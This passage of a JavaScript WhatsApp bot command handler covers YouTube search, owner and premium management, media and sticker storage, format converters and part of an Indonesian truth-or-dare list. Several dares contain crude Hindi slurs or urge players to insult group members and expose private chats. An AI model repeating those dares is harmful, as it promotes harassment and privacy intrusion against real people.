          ...(await prepareWAMessageMedia({ image: { url: search.all[0].thumbnail } }, { upload: TradzSigma.waUploadToServer })),
          title: '',
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "CLICK HERE",
                                    sections: [
                                        {
                                            title: "",
                                            rows: caption
                                        }
                                    ]
                                })
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: m }, {});
    await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
searchYouTube(text)
          }
            break
            case 'yts3': case 'ytsearch3': {
if (!text) return replyviex(`Contoh : ${prefix + command} story wa anime`)
const yts = require('yt-search');
async function searchYouTube(text) {
    let search = await yts(text);
    let teks = `🔎 YouTube Search\n\n Hasil Pencarian dari: ${text}\n\n`;
    let no = 1;
    let caption = search.all.map((v, i) => {
        return {
            header: "",
            title: v.title,
            description: `[ ytmp4 ] Link: ${v.url}`,
            id: '.ytmp3' + v.url
        };
    });

    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List di bawah ini`
                    },
                    footer: {
                        text: namabot
                    },
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: search.all[0].thumbnail } }, { upload: TradzSigma.waUploadToServer })),
          title: '',
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "CLICK HERE",
                                    sections: [
                                        {
                                            title: "",
                                            rows: caption
                                        }
                                    ]
                                })
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: m }, {});
    await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
}
searchYouTube(text)
          }
            break
case 'warcall': {
 if (!m.isGroup) return reply(mess.only.group)
if(!text) return reply(`contoh: \n.warcall kontol`)
TradzSigma.relayMessage(m.chat, {
scheduledCallCreationMessage: {
callType: 2,
scheduledTimestampMs:  Date.now(),
title: text
}
}, {})
}
break
case 'xxxxplay':{
if (!text) return replyviex(`Contoh : ${prefix+command} story wa anime`)
replyviex(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = `${ownernumber}@s.whatsapp.net`
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}
Link : ${anu.url}

Copy the link above and type the .ytmp3 link for audio and the .ytmp4 link for video`
TradzSigma.sendMessage(m.chat, { image : eek, caption: ngen }, { quoted: m})
}
break
/*
case 'ytmp3xx': { 
const yts = require('yt-search');
const randomAudioQuality = () => {
    const qualities = [1, 2, 3, 4]; // Indeks kualitas
    const randomIndex = Math.floor(Math.random() * qualities.length);
    return qualities[randomIndex];
};
const checkQuality = (type, qualityIndex) => {
    const qualities = {
        audio: { 1: '32', 2: '64', 3: '128', 4: '192' },
        video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
    };
    if (!qualities[type]?.[qualityIndex]) {
        throw new Error(`❌ Kualitas ${type} tidak valid. Pilih salah satu: ${Object.keys(qualities[type]).join(', ')}`);
    }
};
const fetchData = async (url, cdn, body = {}) => {
    const headers = {
        accept: '*//*',
        referer: 'https://ytshorts.savetube.me/',
        origin: 'https://ytshorts.savetube.me/',
        'user-agent': 'Postify/1.0.0',
        'Content-Type': 'application/json',
        authority: `cdn${cdn}.savetube.su`
    };
    try {
        const response = await axios.post(url, body, { headers });
        return response.data;
    } catch (error) {
        console.error(`Error accessing CDN${cdn}: ${error.message}`);
        throw new Error('❌ Gagal mengambil data dari server.');
    }
};
const randomCdn = () => {
    const availableCdns = [51, 52, 53, 54, 56, 57, 58, 59, 60, 61];
    return availableCdns[Math.floor(Math.random() * availableCdns.length)];
};
const dLink = (cdnUrl, type, quality, videoKey) => {
    return `https://${cdnUrl}/download`;
};
const dl = async (link, qualityIndex, typeIndex) => {
    const type = typeIndex === 1 ? 'audio' : 'video';
    const qualities = { 1: '32', 2: '64', 3: '128', 4: '192' };
    const quality = qualities[qualityIndex];

    if (!type) throw new Error('❌ Tipe tidak valid. Pilih 1 untuk audio atau 2 untuk video.');
    checkQuality(type, qualityIndex);

    const cdnNumber = randomCdn();
    const cdnUrl = `cdn${cdnNumber}.savetube.su`;

    const videoInfo = await fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
    const body = {
        downloadType: type,
        quality: quality,
        key: videoInfo.data.key
    };
    const dlRes = await fetchData(dLink(cdnUrl, type, quality, videoInfo.data.key), cdnNumber, body);

    return {
        link: dlRes.data.downloadUrl,
        duration: videoInfo.data.duration,
        durationLabel: videoInfo.data.durationLabel,
        fromCache: videoInfo.data.fromCache,
        id: videoInfo.data.id,
        key: videoInfo.data.key,
        thumbnail: videoInfo.data.thumbnail,
        thumbnail_formats: videoInfo.data.thumbnail_formats,
        title: videoInfo.data.title,
        titleSlug: videoInfo.data.titleSlug,
        videoUrl: videoInfo.data.url,
        quality,
        type
    };
};
if (!text) return reply("Kirim perintah dengan link YouTube-nya!");
try {
TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
    let rus = await yts(text);
    if (rus.all.length === 0) return reply("Video tidak ditemukan atau tidak bisa di-download.");
    let data = rus.all.filter(v => v.type === 'video');
    if (data.length === 0) return reply("Tidak ada video yang ditemukan.");
    let res = data[0];
    let thumbUrl = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`;
    let inithumb = await getBuffer(thumbUrl);
    let teks = `*🎶 Y O U T U B E  -  P L A Y 🎶*\n\n` +
               `📺 *Channel* : ${res.author.name}\n` +
               `👀 *Viewers* : ${res.views} kali\n` +
               `⏱️ *Durasi* : ${res.timestamp}\n` +
               `🔗 *Link Video* : ${res.url}\n\n` +
               `🎧 *Audio sedang diproses...* 🎶`;

    await TradzSigma.sendMessage(m.chat, {
        contextInfo: { 
            externalAdReply: { 
                showAdAttribution: true, 
                title: res.title,
                body: new Date().toLocaleString(),													
                mediaType: 2,  
                renderLargerThumbnail: true,
                thumbnail: inithumb,
                mediaUrl: res.url,
                sourceUrl: res.url
            }
        },
        image: { url: thumbUrl },
        text: teks
    }, { quoted: m });

    const isUrl = /^https?:\/\/(www\.)?youtube\.com\/watch\?v=/.test(q);
    let videoUrl = text;
    if (!isUrl) {
        let searchResults = await yts(text);
        if (!searchResults.all.length) return reply("Video tidak ditemukan!");
        let videoData = searchResults.all.find(v => v.type === 'video');
        if (!videoData) return reply("Tidak ada video yang cocok ditemukan!");
        videoUrl = videoData.url;
    }

    const qualityIndex = randomAudioQuality();
    const audioData = await dl(videoUrl, qualityIndex, 1); 
    await TradzSigma.sendMessage(m.chat, { 
        audio: { url: audioData.link }, 
        mimetype: 'audio/mp4' 
    }, { quoted: m });

} catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan: ${err.message}`);
}
}
break;
*/
/*
case 'ytvxxx': case 'ytmp4xxx': case 'mp4xxx':{
if (!text) return replyDinzID('Enter the link!!!')
replyyoimiya(mess.wait)
downloadMp4(text)
}
break
case 'ytaxxx': case 'ytmp3xxx': case 'mp3xxx':{
if (!text) return replyDinzID('Enter the link!!!')
replyyoimiya(mess.wait)
downloadMp3(text)
}
break  
case 'getcase':
if (!TradID) return reply(mess.only.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("TradzID.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replyDinzID(`${getCase(q)}`)
break
*/
//=========================================\\
case 'addprem': {
if (!TradID) return reply(mess.only.owner)
if (!args[0]) return replyviex(`Use ${prefix+command} number\nContoh ${prefix+command} 6283182739135`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await TradzSigma.onWhatsApp(prrkek)
if (ceknya.length == 0) return replyviex(`Masukkan nomor yang valid dan terdaftar di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replyviex(`The Number ${prrkek} Has Been Premium!`)
}
break
//=========================================\\
case 'delprem':
if (!TradID) return reply(mess.only.owner)
if (!args[0]) return replyviex(`Use ${prefix+command} nomor\nContoh ${prefix+command} 6283182739135`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replyviex(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addtoxic':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Whats the word?')
if (Saru.includes(q)) return replyviex("The word is already in use")
Saru.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(Saru))
replyviex(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'deltoxic':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Enter the word')
if (!Saru.includes(q)) return replyviex("The word does not exist in the database")
let wanu = Saru.indexOf(q)
Saru.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(Saru))
replyviex(`Success deleting bad word ${q}`)
}
break
case 'listbadword': {
  let header = '╭─━━━━━━━━━━━━━━━━━━━─╮\n' +
               '│    ✦ 𝗕𝗔𝗗𝗪𝗢𝗥𝗗 𝗟𝗜𝗦𝗧 ✦\n' +
               '╰─━━━━━━━━━━━━━━━━━━━─╯\n' +
               '╭─⭓'
  let footer = '╰─⭓\n\n✧ Total: *' + Saru.length + ' badwords*'
  let teks = header + '\n'
  
  // Tampilkan satu per baris dengan simbol ⛔
  for (let i = 0; i < Saru.length; i++) {
    teks += `│ ⛔ ${Saru[i]}\n`
  }

  teks += footer
  replyviex(teks)
}
break
case 'addvideo':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Whats the video name?')
if (VideoDinzID.includes(q)) return replyviex("The name is already in use")
let delb = await TradzSigma.downloadAndSaveMediaMessage(quoted)
VideoDinzID.push(q)
await fsx.copy(delb, `./library/data/TradMedia/video/${q}.mp4`)
fs.writeFileSync('./library/data/TradMedia/database/xeonvideo.json', JSON.stringify(VideoDinzID))
fs.unlinkSync(delb)
replyviex(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
break
case 'delvideo':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Enter the video name')
if (!VideoDinzID.includes(q)) return replyviex("The name does not exist in the database")
let wanu = VideoDinzID.indexOf(q)
VideoDinzID.splice(wanu, 1)
fs.writeFileSync('./library/data/TradMedia/database/xeonvideo.json', JSON.stringify(VideoDinzID))
fs.unlinkSync(`./library/data/TradMedia/video/${q}.mp4`)
replyviex(`Success deleting video ${q}`)
}
break
case 'listvideo':{
let teks = '┌──⭓「 *Video List* 」\n│\n'
for (let x of VideoDinzID) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VideoDinzID.length}*`
replyviex(teks)
}
break
case 'addimage':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Whats the image name?')
if (GambarTradz.includes(q)) return replyviex("The name is already in use")
let delb = await TradzSigma.downloadAndSaveMediaMessage(quoted)
GambarTradz.push(q)
await fsx.copy(delb, `./library/data/TradMedia/image/${q}.jpg`)
fs.writeFileSync('./library/data/TradMedia/database/xeonimage.json', JSON.stringify(GambarTradz))
fs.unlinkSync(delb)
replyviex(`Success Adding Image\nCheck by typing ${prefix}listimage`)
}
break
case 'delimage':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Enter the image name')
if (!GambarTradz.includes(q)) return replyviex("The name does not exist in the database")
let wanu = GambarTradz.indexOf(q)
GambarTradz.splice(wanu, 1)
fs.writeFileSync('./library/data/TradMedia/database/xeonimage.json', JSON.stringify(GambarTradz))
fs.unlinkSync(`./library/data/TradMedia/image/${q}.jpg`)
replyviex(`Success deleting image ${q}`)
}
break
case 'listimage':{
let teks = '┌──⭓「 *Image List* 」\n│\n'
for (let x of GambarTradz) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${GambarTradz.length}*`
replyviex(teks)
}
break
case 'addsticker':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Whats the sticker name?')
if (StikerTradz.includes(q)) return replyviex("The name is already in use")
let delb = await TradzSigma.downloadAndSaveMediaMessage(quoted)
StikerTradz.push(q)
await fsx.copy(delb, `./library/data/TradMedia/sticker/${q}.webp`)
fs.writeFileSync('./library/data/TradMedia/database/xeonsticker.json', JSON.stringify(StikerTradz))
fs.unlinkSync(delb)
replyviex(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
}
break
case 'delsticker':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Enter the sticker name')
if (!StikerTradz.includes(q)) return replyviex("The name does not exist in the database")
let wanu = StikerTradz.indexOf(q)
StikerTradz.splice(wanu, 1)
fs.writeFileSync('./library/data/TradMedia/database/xeonsticker.json', JSON.stringify(StikerTradz))
fs.unlinkSync(`./library/data/TradMedia/sticker/${q}.webp`)
replyviex(`Success deleting sticker ${q}`)
}
break
case 'liststicker':{
let teks = '┌──⭓「 *Sticker List* 」\n│\n'
for (let x of StikerTradz) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${StikerTradz.length}*`
replyviex(teks)
}
break
case 'addvn':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Whats the audio name?')
if (VoiceNote.includes(q)) return replyviex("The name is already in use")
let delb = await TradzSigma.downloadAndSaveMediaMessage(quoted)
VoiceNote.push(q)
await fsx.copy(delb, `./library/data/assets/audio/${q}.mp3`)
fs.writeFileSync('./library/data/TradMedia/database/xeonvn.json', JSON.stringify(VoiceNote))
fs.unlinkSync(delb)
replyviex(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
}
break
case 'delvn':{
if (!TradID) return reply(mess.only.owner)
if (args.length < 1) return replyviex('Enter the vn name')
if (!VoiceNote.includes(q)) return replyviex("The name does not exist in the database")
let wanu = VoiceNote.indexOf(q)
VoiceNote.splice(wanu, 1)
fs.writeFileSync('./library/data/TradMedia/database/xeonvn.json', JSON.stringify(VoiceNote))
fs.unlinkSync(`./library/data/assets/audio/${q}.mp3`)
replyviex(`Success deleting vn ${q}`)
}
break
case 'listvn':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of VoiceNote) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${VoiceNote.length}*`
replyviex(teks)
}
break
case 'addowner':
if (!TradID) return reply(mess.only.owner)
if (!args[0]) return replyviex(`Use ${prefix+command} number\nContoh ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await TradzSigma.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyviex(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyviex(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!TradID) return reply(mess.only.owner)
if (!args[0]) return replyviex(`Use ${prefix+command} nomor\nContoh ${prefix+command} 6283182739135`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyviex(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let TradzSigma of prem) {
teks += `- ${TradzSigma}\n`
}
teks += `\n*Total : ${prem.length}*`
TradzSigma.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setcmd': {
if (!m.quoted) return replyviex('Reply Message!')
if (!m.quoted.fileSha256) return replyviex('SHA256 Hash Missing')
if (!text) return replyviex(`For What Command?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replyviex('You have no permission to change this sticker command')
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
replyviex(`Done!`)
            }
            break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return replyviex(`No hashes`)
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replyviex('You have no permission to delete this sticker command')             
delete global.db.sticker[hash]
replyviex(`Done!`)
            }
            break
case 'listcmd': {
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
TradzSigma.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
if (!TradID) return reply(mess.only.owner)
if (!m.quoted) return replyviex('Reply Message!')
if (!m.quoted.fileSha256) return replyviex('SHA256 Hash Missing')
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.sticker)) return replyviex('Hash not found in database')
global.db.sticker[hash].locked = !/^un/i.test(command)
replyviex('Done!')
            }
            break
case 'addmsg': {
if (!m.quoted) return replyviex('Reply Message You Want To Save In Database')
if (!text) return replyviex(`Contoh : ${prefix + command} filename`)
let msgs = global.db.database
if (text.toLowerCase() in msgs) return replyviex(`'${text}' registered in the message list`)
msgs[text.toLowerCase()] = quoted.fakeObj
replyviex(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
case 'getmsg': {
if (!text) return replyviex(`Contoh : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
let msgs = global.db.database
if (!(text.toLowerCase() in msgs)) return replyviex(`'${text}' not listed in the message list`)
TradzSigma.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case 'listmsg': {
let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replyviex(teks)
	    }
	    break
	case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replyviex(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replyviex(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'setexif': {
               if (!TradID) return reply(mess.only.owner)
               if (!text) return replyviex(`Contoh : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replyviex(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await TradzSigma.fetchStatus(who)
    replyviex(bio.status)
  } catch {
    if (text) return replyviex(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await TradzSigma.fetchStatus(who)
      replyviex(bio.status)
    } catch {
      return replyviex(`biodatanya pribadi atau Anda belum membalas pesan orang tersebut!`)
    }
  }
}
break
case 'setppbot': case 'setbotpp': {
if (!TradID) return reply(mess.only.owner)
if (!quoted) return replyviex(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return replyviex(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyviex(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var medis = await TradzSigma.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await TradzSigma.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replyviex(`Success`)
} else {
var memeg = await TradzSigma.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replyviex(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!TradID) return reply(mess.only.owner)
if (!args.join(" ")) return replyviex(`Use ${prefix+command} groupname`)
try {
let cret = await TradzSigma.groupCreate(args.join(" "), [])
let response = await TradzSigma.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
TradzSigma.sendMessage(m.chat, { text:teks, mentions: await TradzSigma.parseMention(teks)}, {quoted:m})
} catch {
reply('yah Error kak laporankan ke owner agar di perbaiki')
}
}
break
case 'lick': case 'kiss': {
if (!isPrem) return replyprem(mess.premium)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
TradzSigma.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
TradzSigma.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'spank1':
case 'meow':
case 'tickle':{
axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
TradzSigma.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tomp4': case 'tovideo': {
if (!quoted) return replyviex('Balas ke Stiker')
if (!/webp/.test(mime)) return replyviex(`stiker balasan dengan judul *${prefix + command}*`)
replyviex(mess.wait)
		        let { webp2mp4File } = require('./lib/uploader')
let media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await TradzSigma.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Konversi Webp ke Video' } }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'tomp3': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replyviex(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replyviex(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            replyviex(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            TradzSigma.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replyviex(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replyviex(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            replyviex(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            TradzSigma.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
if (!quoted) return replyviex('Reply video')
if (!/webp/.test(mime)) return replyviex(`reply sticker with caption *${prefix + command}*`)
replyviex(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
let media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await TradzSigma.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replyviex(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await TradzSigma.sendMessage(from, { image: medi, caption:"Ini dia!!"}, { quoted: m })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'dare':
              const dare =[
"Makan 2 sendok makan nasi tanpa lauk apapun, jika terasa berat, kamu bisa minum.",
"Sebutkan orang yang membuatmu terdiam",
"Telepon gebetan/pacar sekarang dan kirim tangkapan layar di sini",
"Kirim emot hanya setiap kali kamu mengetik di grup obrolan/obrolan pribadi selama 1 hari.",
"Ucapkan 'Selamat datang di Who Wants To Be a Millionaire!' ke semua grup yang kamu punya",
"Telepon mantan dengan mengatakan rindu",
"nyanyikan chorus dari lagu terakhir yang kamu mainkan",
"Rekam suara untuk mantan/pacar/gebemmu, katakan 'Hai (nama), ingin menelepon, tunggu sebentar. Aku sangat merindukanmu'",
"Pukul meja (yang ada di rumah) sampai kamu dimarahi karena berisik",
"Katakan pada orang asing 'Aku baru saja diberitahu bahwa aku adalah saudaramu yang pertama, kami berpisah, lalu aku melakukan operasi plastik. Dan ini hal paling 'ciyusss'",
"Sebutkan nama mantan",
"buat 1 sajak untuk anggota grup!",
"Kirim daftar percakapan WhatsAppmu",
"Obrol dengan orang asing dengan bahasa ghetto lalu tangkap layar di sini",
"Ceritakan versimu sendiri tentang hal-hal memalukan",
"Tag orang yang kamu benci",
"Pura-pura seperti terkena pengaruh, misalnya: terkena pengaruh anjing, terkena pengaruh belalang, terkena pengaruh lemari es, dll.",
"Ubah nama menjadi *I AM DONKEY* selama 24 jam",
"Teriak *ma chuda ma chuda ma chuda* di depan rumahmu",
"Ambil foto/potret pacar atau gebetanmu dan kirimkan di sini",
"Ceritakan tipe pacar yang kamu sukai!",
"Ucapkan *aku naksir kamu, maukah kamu menjadi pacarku?* kepada lawan jenis, terakhir kali kamu berbicara dengannya (kirim di WA/Telegram), tunggu sampai dia membalas, jika sudah, berikan di sini",
"Rekam suaramu yang membaca *titar ke age do titar, titar ke piche do titar*",
"Chatingan lelucon dengan mantan dan katakan *aku mencintaimu, tolong kembalilah.* tanpa menyebutkan bahwa itu adalah tantangan!",
"Obrol dengan kontak WhatsApp berurutan sesuai dengan persentase baterai ponselmu, lalu katakan 'Aku beruntung memiliki kamu!'",
"Ubah nama menjadi *I am a child of randi* selama 5 jam",
"Ketik dalam bahasa Bengali selama 24 jam",
"Gunakan foto Selmon Bhoi selama 3 hari",
"Kirim kutipan lagu lalu tag anggota yang cocok untuk kutipan tersebut",
"Kirim pesan suara dengan ucapan 'Bolehkah aku memanggilmu sayang?'",
"Tangkapan layar percakapan terakhir di WhatsAppmu",
"Ucapkan *KAMU SANGAT CANTIK, JANGAN BERBOHONG* kepada teman pria!",
"Telepon salah satu anggota grup dan katakan kata kasar kepada mereka",
"Berlakulah seperti ayam di depan orangtua kamu",
"Ambil sebuah buku secara acak dan bacakan satu halaman secara keras dan rekam suara lalu kirimkan di sini",
"Buka pintu depan rumahmu dan menyalak seperti serigala selama 10 detik",
"Ambil foto selfie yang memalukan dan jadikan sebagai foto profilmu",
"Biar grup memilih sebuah kata dan lagu yang dikenal. Kamu harus menyanyikan lagu tersebut dan kirim dalam bentuk pesan suara di sini",
"Berjalanlah dengan menopang dengan siku dan lutut selama yang kamu bisa",
"nyanyikan lagu kebangsaan dalam pesan suara",
"Lakukan breakdance selama 30 detik di ruang tamu",
"Ceritakan cerita sedih yang kamu ketahui",
"Buat video tari twerk singkat dan unggah sebagai status selama 5 menit",
"Makan sepotong bawang putih mentah",
"Tunjukkan lima orang terakhir yang kamu kirim pesan dan isi pesan mereka",
"Jadikan nama lengkapmu sebagai status selama 5 jam",
"Buat video tari singkat tanpa filter hanya dengan musik dan unggah sebagai status selama 5 jam",
"Telepon sahabatmu, omong kosong",
"Jadikan foto dirimu tanpa filter sebagai status selama 10 menit",
"Ucapkan 'aku cinta Oli London' dalam pesan suara 😄",
"Kirim pesan kepada mantanmu dan katakan bahwa kamu masih menyukainya",
"Telepon gebetan/pacar/sahabatmu sekarang dan tangkapan layar di sini",
"Berkata kasar pada salah satu anggota grup di percakapan pribadi dan katakan 'kamu jelek, beban'",
"Ucapkan 'KAMU CANTIK/GANTENG' pada salah satu orang yang ada di atas pinlistmu atau orang pertama di daftar percakapanmu",
"Kirim pesan suara dan katakan 'Bisakah aku memanggilmu sayang?'. Jika kamu seorang pria, sebutkan nama seorang wanita. Jika kamu seorang wanita, sebutkan nama seorang pria",
